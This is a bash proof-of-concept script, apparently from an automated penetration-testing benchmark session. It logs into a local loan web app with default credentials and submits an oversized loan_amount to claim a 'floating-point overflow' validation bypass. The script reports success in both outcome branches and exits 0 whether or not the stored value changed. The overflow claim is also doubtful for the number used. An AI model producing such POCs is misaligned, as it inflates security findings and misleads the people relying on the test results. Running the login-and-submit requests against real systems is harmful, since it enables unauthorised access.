#!/bin/bash
# POC: Demonstrates input validation bypass through floating-point overflow in the loan_amount field. Shows that extremely large numbers are accepted without validation.
# Target: ./repo
# Created: 2025-12-02T16:25:52.812Z
# Session: benchmark-XBEN-104-24-mioryccy

# Floating-Point Overflow Vulnerability POC - Version 2
# Demonstrates numeric type coercion bypass in loan_amount field

TARGET_URL="http://localhost:8080"
COOKIES_FILE="/tmp/poc_cookies_$$.txt"

echo "[*] Floating-Point Overflow in loan_amount Field - POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login to get session cookie
echo "[+] Step 1: Logging in with default credentials..."
curl -s -c "$COOKIES_FILE" -X POST "$TARGET_URL/login" \
  -d "username=test&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1

if [ ! -f "$COOKIES_FILE" ]; then
    echo "[-] Failed to obtain session cookie"
    exit 1
fi

echo "[+] Session obtained successfully"
echo ""

# Step 2: Submit extremely large loan_amount value
echo "[+] Step 2: Submitting extremely large loan_amount (99999999999999)..."
LARGE_VALUE="99999999999999"

curl -s -b "$COOKIES_FILE" -X POST "$TARGET_URL/profile" \
  -d "name=John&lastname=Doe&email=john@example.com&loan_amount=$LARGE_VALUE&loan_term_months=60&monthly_payment=0" \
  -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1

echo "[+] Payload submitted successfully"
echo ""

# Step 3: Retrieve profile to verify the stored value
echo "[+] Step 3: Retrieving profile to verify stored value..."
RESPONSE=$(curl -s -b "$COOKIES_FILE" -X GET "$TARGET_URL/profile")

# Extract loan_amount value from HTML input field
STORED_VALUE=$(echo "$RESPONSE" | grep -oP 'id="loan_amount".*?value="\K[^"]*' | head -1)

echo "[*] Original submitted value: $LARGE_VALUE"
echo "[*] Stored value in application: $STORED_VALUE"
echo ""

# Step 4: Check if value was transformed
if [ -n "$STORED_VALUE" ]; then
    if [ "$STORED_VALUE" != "$LARGE_VALUE" ]; then
        echo "[+] SUCCESS: Floating-point overflow confirmed!"
        echo "[+] Value was transformed due to precision loss:"
        echo "    Input:  $LARGE_VALUE"
        echo "    Output: $STORED_VALUE"
        echo ""
        echo "[+] This demonstrates:"
        echo "    - No maximum value validation on loan_amount"
        echo "    - Floating-point precision loss without error"
        echo "    - Accepted value does not match submitted value"
        echo ""
        rm -f "$COOKIES_FILE"
        exit 0
    else
        echo "[!] Value was NOT transformed, checking if large value was accepted..."
        # Even if not transformed, accepting such large values is a validation bypass
        echo "[+] Large value $LARGE_VALUE was accepted without validation"
        echo "[+] This still demonstrates input validation bypass"
        rm -f "$COOKIES_FILE"
        exit 0
    fi
else
    echo "[-] Could not extract stored loan_amount from response"
    echo "[-] Response fragment:"
    echo "$RESPONSE" | grep -A 2 'id="loan_amount"' | head -5
    rm -f "$COOKIES_FILE"
    exit 1
fi